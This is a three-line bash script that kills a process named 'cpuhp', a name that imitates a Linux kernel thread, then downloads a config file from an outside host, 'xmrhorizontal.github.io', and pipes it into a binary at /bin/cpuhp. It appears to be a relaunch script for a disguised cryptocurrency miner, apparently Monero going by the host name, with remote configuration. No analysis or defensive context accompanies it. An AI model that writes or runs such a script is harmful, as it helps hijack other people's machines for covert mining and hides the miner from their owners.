#!/bin/bash
killall cpuhp
curl -s https://xmrhorizontal.github.io/config.json | /bin/cpuhp --config /dev/stdin
